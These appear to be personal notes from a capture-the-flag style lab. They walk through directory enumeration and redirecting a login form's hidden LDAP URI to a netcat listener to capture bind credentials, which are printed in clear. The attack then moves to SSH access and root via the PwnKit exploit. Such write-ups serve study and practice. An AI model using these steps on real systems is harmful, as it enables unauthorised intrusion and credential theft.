## Web Enumeration

![[Pasted image 20240514211741.png]]

```rust
feroxbuster -u http://10.10.110.21/ -x pdf -x js,html -x php -x txt -x json,docx --filter-status 503 -v   
```

```rust
200      GET      194l      621w    10870c http://10.10.110.21/contact
200      GET        6l       71w     4592c http://10.10.110.21/assets/js/respond.min.js
200      GET        4l       85w     2731c http://10.10.110.21/assets/js/html5shiv.min.js
200      GET       89l      857w     9340c http://10.10.110.21/assets/css/booze.css
200      GET      107l      253w     3385c http://10.10.110.21/assets/form/js/form.js
200      GET        1l      133w     6231c http://10.10.110.21/assets/js/jquery.gray.min.js
200      GET      138l      350w     5910c http://10.10.110.21/assets/js/gmaps/init.js
200      GET      185l      593w    10390c http://10.10.110.21/login
200      GET      180l      695w    10942c http://10.10.110.21/blog/1
200      GET       13l       93w     3864c http://10.10.110.21/assets/images/content/booze/menu-icon1-colored.png
200      GET      179l      797w    11357c http://10.10.110.21/blog/2
200      GET       14l       88w     5047c http://10.10.110.21/assets/images/content/booze/scroller.png
200      GET        7l       22w     1474c http://10.10.110.21/assets/images/content/booze/author.png
200      GET        9l       82w     3525c http://10.10.110.21/assets/images/content/booze/menu-icon2-colored.png
200      GET      266l      866w    12981c http://10.10.110.21/store
200      GET        4l       57w     2404c http://10.10.110.21/assets/images/content/booze/icon-office-pin.png
200      GET      223l      809w    13335c http://10.10.110.21/events
200      GET       22l      211w    13789c http://10.10.110.21/assets/images/content/booze/watch-icon.png
200      GET       31l       95w      765c http://10.10.110.21/assets/js/age-ver.js
200      GET        8l       67w     3459c http://10.10.110.21/assets/images/content/booze/menu-icon2.png
200      GET      612l     1238w    20626c http://10.10.110.21/assets/js/main.js
200      GET       13l       89w     3807c http://10.10.110.21/assets/images/content/booze/menu-icon1.png
200      GET        4l       66w    31000c http://10.10.110.21/assets/css/font-awesome.min.css
200      GET        7l      635w    17595c http://10.10.110.21/assets/js/es5-shim.min.js
200      GET      294l     1331w    18512c http://10.10.110.21/masterclass
200      GET      180l      693w    10861c http://10.10.110.21/blog/3
200      GET       78l      404w    29244c http://10.10.110.21/assets/images/content/booze/blog3.jpg
200      GET       58l      249w    18915c http://10.10.110.21/assets/images/content/booze/blog2.jpg
200      GET      806l     5230w    38387c http://10.10.110.21/assets/js/gmaps/gmap3.min.js
200      GET       59l      339w    27385c http://10.10.110.21/assets/images/content/booze/blog1.jpg
200      GET      328l     2758w   134687c http://10.10.110.21/assets/images/content/booze/main-picture2.jpg
200      GET      378l     2394w   194040c http://10.10.110.21/assets/images/content/booze/logo.png
200      GET        6l     1429w   121200c http://10.10.110.21/assets/css/bootstrap.min.css
200      GET      378l     2394w   194040c http://10.10.110.21/assets/images/content/booze/logo-footer.png
200      GET      831l     3521w   246920c http://10.10.110.21/assets/images/content/booze/slide1.jpg
200      GET     7259l    22629w   233803c http://10.10.110.21/assets/css/style.css
200      GET      378l     2394w   194040c http://10.10.110.21/assets/images/content/booze/big-intro.png
200      GET      316l     1207w    19359c http://10.10.110.21/
200      GET     8692l    49220w   425718c http://10.10.110.21/assets/js/booze.min.js

```

```rust
POST /login HTTP/1.1

Host: 10.10.110.21

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0

Accept: application/json, text/javascript, */*; q=0.01

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate, br

Content-Type: application/x-www-form-urlencoded; charset=UTF-8

X-Requested-With: XMLHttpRequest

Content-Length: 90

Origin: http://10.10.110.21

Connection: close

Referer: http://10.10.110.21/login

Cookie: age-verification=true



username=test&password=test&ldapuri=ldap%3A%2F%2F172.16.0.2%3A389&email_subject=Login+Form
```

```rust
ldap://172.16.0.2:389
```

```rust
                  </div>
                  <input type="hidden" name="ldapuri" value="ldap://172.16.0.2:389">
                  <div class="col-md-4 col-sm-4">
                    <div class="form-group ct-u-paddingBottom15 ct-showBg ct-js-input">
                      <button type="submit" class="btn btn-primary btn-sm btn-border btn-stretched" onclick="window.location='/admin';" >Login</button>
```


![[Pasted image 20240514214947.png]]

Lets look at this login now. 

![[Pasted image 20240514215335.png]]

lets modify the IP to redirect the LDAP to my NC Listener

```rust
❯ nc -lvnp 389
listening on [any] 389 ...
connect to [10.10.14.21] from (UNKNOWN) [10.10.110.21] 54410
06`1calde_ldap@alchemy.htbCsAdlLDAPMoDeBrnd12!
```

calde_ldap : CsAdlLDAPMoDeBrnd12!

![[Pasted image 20240514220113.png]]

Analyzing .ST files 

![[Pasted image 20240514222011.png]]

![[Pasted image 20240514221928.png]]

```rust
LandIAtErOUs
```

Also the user aepike is the one doing the commits

```
aepike : LandIAtErOUs
```

![[Pasted image 20240514222448.png]]

```rust
aepike@web01:/home$ ls
aepike
```

SSH into the users account

```rust
[+] [CVE-2021-4034] PwnKit                                                                   
                                                                                             
   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt                       
   Exposure: probable                                                                        
   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro    
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main                   

```

```rust
aepike@web01:~/p3ta/PwnKit (copy 1)$ ./PwnKit                 
root@web01:/home/aepike/p3ta/PwnKit (copy 1)# cd ..           
root@web01:/home/aepike/p3ta# cd ..                           
root@web01:/home/aepike# cd ..                                
root@web01:/home# whoami                                      
root                                                          
```